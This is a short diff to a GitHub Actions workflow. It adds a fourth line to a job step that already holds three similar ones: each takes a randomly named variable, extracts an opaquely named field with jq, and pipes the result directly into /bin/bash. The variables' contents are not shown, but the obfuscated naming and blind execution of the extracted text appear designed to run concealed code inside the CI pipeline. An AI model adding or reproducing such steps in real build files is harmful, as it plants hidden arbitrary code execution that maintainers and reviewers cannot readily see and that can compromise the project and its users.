@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$qate41" | jq -r .ivvq63290 | /bin/bash
           echo $hegr98451 | jq -r .zbfq672 | /bin/bash
           echo $jsism76 | jq -r .v0 | /bin/bash
+          printf '%s' "$i1" | jq -r .w00 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
